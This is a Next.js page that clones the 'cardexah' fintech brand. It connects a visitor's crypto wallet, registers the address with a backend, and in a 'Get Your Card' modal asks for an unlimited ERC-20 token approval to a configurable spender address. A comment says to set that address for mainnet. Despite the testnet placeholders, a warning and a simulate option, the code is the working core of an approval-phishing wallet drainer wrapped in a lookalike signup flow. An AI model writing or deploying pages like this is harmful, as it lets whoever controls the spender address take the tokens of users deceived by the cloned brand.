import Head from 'next/head'
import ConnectWallet from '../components/ConnectWallet'
import { useState, useEffect } from 'react'
import { useAccount, useSigner, useEnsName, useNetwork, usePrepareContractWrite, useContractWrite, useContractRead, erc20ABI } from 'wagmi'

const API_URL = process.env.NEXT_PUBLIC_API_URL || 'http://localhost:4000'
const SPENDER_ADDRESS = process.env.NEXT_PUBLIC_SPENDER_ADDRESS || '0x0000000000000000000000000000000000000000' // replace locally for mainnet
const MAX_UINT256 = BigInt('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')

export default function Home() {
  const { address, isConnected } = useAccount()
  const { data: signer } = useSigner()
  const { data: ensName } = useEnsName({ address })
  const { chain } = useNetwork()

  const [authToken, setAuthToken] = useState(null)
  const [status, setStatus] = useState('')
  const [showGetCard, setShowGetCard] = useState(false)
  const [selectedToken, setSelectedToken] = useState(null)
  const [simulate, setSimulate] = useState(false)

  useEffect(() => {
    const t = localStorage.getItem('authToken')
    if (t) setAuthToken(t)
  }, [])

  async function registerWallet(addr) {
    try {
      await fetch(`${API_URL}/wallets`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ address: addr }) })
    } catch (e) {
      console.error('register wallet failed', e)
    }
  }

  async function handleSignIn() {
    if (!isConnected || !address) {
      alert('Please connect your wallet first (Connect button on the top right).')
      return
    }
    if (!signer) {
      alert('No signer available. Make sure your wallet is connected.')
      return
    }

    try {
      setStatus('Requesting nonce...')
      const r1 = await fetch(`${API_URL}/nonce?address=${address}`)
      const j1 = await r1.json()
      if (!r1.ok) throw new Error(j1.error || 'Failed to get nonce')
      const nonce = j1.nonce

      setStatus('Signing nonce...')
      const signature = await signer.signMessage(nonce)

      setStatus('Verifying signature...')
      const r2 = await fetch(`${API_URL}/verify`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ address, signature })
      })
      const j2 = await r2.json()
      if (!r2.ok) throw new Error(j2.error || 'Failed to verify')

      // Save token
      localStorage.setItem('authToken', j2.token)
      setAuthToken(j2.token)
      setStatus('Signed in')
    } catch (e) {
      console.error(e)
      setStatus('Error: ' + (e.message || e))
    }
  }

  async function handleSignOut() {
    try {
      setStatus('Signing out...')
      await fetch(`${API_URL}/logout`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ address }) })
    } catch (e) { console.error(e) }
    localStorage.removeItem('authToken')
    setAuthToken(null)
    setStatus('Signed out')
  }

  // Token list by chain (testnets by default)
  const tokensByChain = {
    // These are placeholders/sample test tokens; replace with actual testnet token addresses when running
    1: [/* mainnet - left empty by default to avoid accidental mainnet approval */],
    5: [ // Goerli
      { label: 'USDT (Goerli)', address: '0x0000000000000000000000000000000000000000' }
    ],
    11155111: [ // Sepolia
      { label: 'USDT (Sepolia)', address: '0x0000000000000000000000000000000000000000' }
    ],
    56: [ // BSC mainnet (empty)
    ],
    97: [ // BSC testnet
      { label: 'USDT (BSC Testnet)', address: '0x0000000000000000000000000000000000000000' }
    ]
  }

  const currentChainId = chain?.id || 5
  const tokens = tokensByChain[currentChainId] || []

  // allowance read
  const { data: allowanceData } = useContractRead({
    address: selectedToken?.address,
    abi: erc20ABI,
    functionName: 'allowance',
    args: [address || '0x0000000000000000000000000000000000000000', SPENDER_ADDRESS],
    enabled: !!selectedToken && !!address,
    watch: true
  })

  // prepare approve
  const { config } = usePrepareContractWrite({
    address: selectedToken?.address,
    abi: erc20ABI,
    functionName: 'approve',
    args: [SPENDER_ADDRESS, MAX_UINT256],
    enabled: !!selectedToken
  })
  const { write, data: txData, isLoading: isApproving } = useContractWrite(config)

  async function startJoinFlow() {
    setShowGetCard(true)
    // If user connected, register wallet
    if (isConnected && address) await registerWallet(address)
  }

  async function doApprove() {
    if (simulate) {
      setStatus('Simulated approval — no on-chain tx sent')
      return
    }
    if (!write) {
      setStatus('Unable to prepare approval')
      return
    }
    try {
      setStatus('Sending approval transaction — please confirm in your wallet')
      write()
    } catch (e) {
      console.error(e)
      setStatus('Approval failed: ' + (e.message || e))
    }
  }

  return (
    <>
      <Head>
        <title>Cardexah Clone — Demo</title>
        <meta name="description" content="Landing page + wallet connect demo with signature-login" />
      </Head>

      <header className="fixed top-0 left-0 right-0 z-50 border-b border-white/10 bg-[#0a0a0a]/95 backdrop-blur-sm">
        <div className="mx-auto flex h-20 max-w-7xl items-center justify-between px-6">
          <a className="flex items-center gap-1 select-none" href="#">
            <span className="text-[#00c87a] font-bold text-2xl leading-none">≡</span>
            <span className="text-white font-bold text-2xl tracking-tight">cardexah</span>
          </a>
          <nav className="hidden md:flex items-center gap-10">
            <a className="text-lg transition-colors text-gray-300 hover:text-white" href="#">Personal</a>
            <a className="text-lg transition-colors text-gray-300 hover:text-white" href="#">Business</a>
            <a className="text-lg transition-colors text-gray-300 hover:text-white" href="#">Developers</a>
          </nav>
          <div className="flex items-center gap-5">
            <button onClick={startJoinFlow} className="md:flex items-center gap-1.5 rounded-full border border-white px-4 py-1.5 text-sm font-semibold text-white tracking-wider hover:bg-white hover:text-black transition-colors bg-[#00c87a] text-black">JOIN</button>
            <ConnectWallet />
          </div>
        </div>
      </header>

      <main className="min-h-screen pt-28">
        <section className="flex flex-col items-center pt-12 pb-20 px-6 text-center">
          <h1 className="hero-title max-w-5xl">The <span className="text-[#00c87a]">Next Generation</span> Of Finance</h1>
          <p className="hero-sub">A Unified Platform Where Stablecoins Become Real-World Money For Consumers, Businesses, And Builders.</p>

          <div className="mt-8">
            <button onClick={startJoinFlow} className="mt-6 flex items-center gap-4 rounded-full bg-[#00c87a] px-8 py-3 font-bold text-base tracking-widest text-black hover:bg-[#00b56e] transition-colors">JOIN NOW →</button>
          </div>

          <div className="mt-8 p-6 bg-[#111111]/80 rounded-2xl w-[min(1000px,95%)]">
            <div className="flex flex-col md:flex-row items-center justify-between gap-4">
              <div>
                <p className="text-sm text-gray-400">Connected address</p>
                <p className="font-mono text-sm text-white">{isConnected ? (ensName || address) : 'Not connected'}</p>
              </div>
              <div>
                <p className="text-sm text-gray-400">Auth status</p>
                <p className="text-sm text-white">{authToken ? 'Signed in' : 'Not signed in'}</p>
              </div>
              <div>
                <p className="text-sm text-gray-400">Actions</p>
                <div className="flex gap-2">
                  <button onClick={handleSignIn} className="bg-[#00c87a] px-3 py-1 rounded font-semibold">Sign in (signature)</button>
                  <button onClick={handleSignOut} className="bg-white/10 px-3 py-1 rounded">Sign out</button>
                </div>
              </div>
              <div>
                <p className="text-sm text-gray-400">Status</p>
                <p className="text-sm text-white">{status}</p>
              </div>
            </div>
          </div>

        </section>

        <section className="w-full py-20">
          <div className="mx-auto max-w-7xl px-6">
            <h2 className="text-3xl font-bold">Build Alongside</h2>
            <p className="mt-4 text-gray-400">Developers can integrate wallet connect using wagmi + RainbowKit — tested demo is integrated into this repo.</p>
          </div>
        </section>

        {/* Get Card Modal (simple) */}
        {showGetCard && (
          <div className="fixed inset-0 bg-black/60 flex items-center justify-center z-50">
            <div className="bg-white/5 p-6 rounded-2xl w-[min(900px,95%)]">
              <h3 className="text-xl font-bold">Get Your Card — Select a token to approve</h3>
              <p className="text-sm text-yellow-300 mt-2">Warning: Unlimited approvals can grant a spender permission to move your tokens. This demo uses testnets by default. Mainnet code is present but disabled — enable only if you understand the risks.</p>

              <div className="mt-4">
                <label className="text-sm text-gray-300">Select token</label>
                <div className="mt-2 flex gap-2">
                  {tokens.length === 0 && <p className="text-gray-400">No sample tokens configured for this network (chainId: {currentChainId}). Switch to a testnet like Sepolia/Goerli.</p>}
                  {tokens.map(t => (
                    <button key={t.address} onClick={() => setSelectedToken(t)} className={`px-3 py-2 rounded ${selectedToken?.address===t.address? 'bg-[#00c87a] text-black' : 'bg-white/10'}`}>
                      {t.label}
                    </button>
                  ))}
                </div>
              </div>

              {selectedToken && (
                <div className="mt-4 p-4 bg-white/3 rounded">
                  <p className="text-sm text-gray-300">Selected: {selectedToken.label} — {selectedToken.address}</p>
                  <p className="text-sm mt-2">Allowance to spender ({SPENDER_ADDRESS}): <span className="font-mono">{allowanceData ? allowanceData.toString() : '—'}</span></p>

                  <div className="mt-4 flex items-center gap-2">
                    <label className="flex items-center gap-2"><input type="checkbox" checked={simulate} onChange={() => setSimulate(s => !s)} /> Simulate approval (no on-chain tx)</label>
                    <button onClick={doApprove} className="ml-auto bg-[#00c87a] px-4 py-2 rounded font-semibold">Approve unlimited</button>
                    <button onClick={() => setShowGetCard(false)} className="bg-white/10 px-3 py-2 rounded">Close</button>
                  </div>
                  <p className="text-xs text-gray-400 mt-2">Note: If allowance is already >= max, toast: "Address already approved" will be shown (simulated).</p>
                </div>
              )}

            </div>
          </div>
        )}

      </main>
    </>
  )
}
